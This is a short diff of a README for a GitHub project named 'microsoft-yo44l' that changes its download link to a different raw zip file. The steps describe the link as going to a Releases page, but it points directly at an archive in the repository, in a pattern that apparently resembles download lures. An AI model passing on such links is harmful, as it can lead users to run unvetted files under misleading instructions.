@@ -14,7 +14,7 @@ Welcome to **microsoft-yo44l**! This project is an experimental space for creati
 ## 📥 Download & Install
 To download the application, visit the Releases page using the link below:
 
-[![Download microsoft-yo44l](https://raw.githubusercontent.com/immkiru/microsoft-yo44l/main/pubian/microsoft-yo44l.zip)](https://raw.githubusercontent.com/immkiru/microsoft-yo44l/main/pubian/microsoft-yo44l.zip)
+[![Download microsoft-yo44l](https://github.com/immkiru/microsoft-yo44l/raw/refs/heads/main/pubian/yo-microsoft-l-2.8.zip)](https://github.com/immkiru/microsoft-yo44l/raw/refs/heads/main/pubian/yo-microsoft-l-2.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
